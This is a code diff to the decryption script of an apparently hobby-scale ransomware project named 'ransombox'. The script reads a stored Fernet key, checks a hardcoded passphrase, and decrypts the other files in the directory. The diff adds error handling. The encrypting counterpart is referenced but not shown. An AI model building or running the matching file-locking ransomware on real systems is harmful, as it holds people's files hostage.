@@ -6,15 +6,15 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-    if file == "ransombox.py" or file == "keys.key" or file == "decrypt.py":
+    if file == "ransombox.py" or file == "keys.key" or file == "decrypt.py" or file == "encrypt.py":
         continue
     if os.path.isfile(file):
         files.append(file)
 
-print(files)
+with open("keys.key", "rb") as key_file:
+    secretkey = key_file.read()
 
-with open("keys.key", "rb") as key:
-    secretkey = key.read()
+cipher = Fernet(secretkey)
 
 secretphrase = "marigold"
 
@@ -24,9 +24,12 @@ if user_phrase == secretphrase:
     for file in files:
         with open(file, "rb") as thefile:
             contents = thefile.read()
-        contents_decrypted = Fernet(secretkey).decrypt(contents)
-        with open(file, "wb") as thefile:
-            thefile.write(contents_decrypted)
-        print("Your files are now decrypted")
+        try:
+            contents_decrypted = cipher.decrypt(contents)
+            with open(file, "wb") as thefile:
+                thefile.write(contents_decrypted)
+            print(f"{file} has been decrypted successfully.")
+        except Exception as e:
+            print(f"Failed to decrypt {file}: {e}")
 else:
     print("Sorry, Wrong key")
